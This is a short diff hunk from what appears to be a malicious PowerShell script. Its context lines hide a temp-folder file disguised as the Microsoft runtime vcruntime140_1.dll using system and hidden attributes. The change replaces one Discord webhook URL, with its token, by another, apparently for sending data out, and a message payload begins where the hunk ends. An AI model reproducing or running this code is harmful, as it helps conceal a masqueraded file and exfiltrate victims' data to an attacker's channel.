@@ -27,7 +27,7 @@ attrib +s +h "$env:tmp\vcruntime140_1.dll"
 sleep 2
 
 # Define the Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1253055227247198260/bVxZXaVNTuB9SfGYqI_gnuZxNBrc5MoTxJdUpGvkC6Hh4-14j2LuBfGFoMVDoitZF1Gn"
+$webhookUrl = "https://discord.com/api/webhooks/1261317258626600960/FndAhWm-Hqyukq_WZv_vl2bTXCQ6cQQSwPJAZLpidubc0gjibx3hZO2HPUAMWO4tdc9n"
 
 # Define the message payload
 $payload = @{
